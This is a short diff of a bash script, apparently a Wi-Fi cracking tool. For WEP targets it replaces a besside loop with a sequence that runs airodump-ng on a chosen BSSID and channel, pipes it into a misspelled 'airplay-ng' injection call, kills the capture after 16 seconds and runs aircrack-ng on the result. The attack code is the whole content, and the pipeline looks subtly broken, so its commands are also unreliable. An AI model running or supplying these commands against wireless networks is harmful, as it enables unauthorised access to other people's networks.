@@ -255,14 +255,17 @@ echo -e ' \e[1;31m '
 echo
 read -p 'security : ' apsec
 
-  if [ $apsec = "wep" ]
-  then
-         while [ $? -ne "1" ]
-         do
-         besside $winterface -c $apch -b $apbssid 
-         done
-              if [ $? -eq 0 ]
-              then
+ if [ $apsec = "wep" ]
+ then
+ xterm -e airodump-ng --bssid $apbssid -c $apch $winterface | airplay-ng $winterface -c $apch -b $apbssid -r crackw &
+ sleep 16
+ kill $!
+ aircrack-ng crackw-01.cap
+ fi
+  
+  
+              
+             
               
               
               
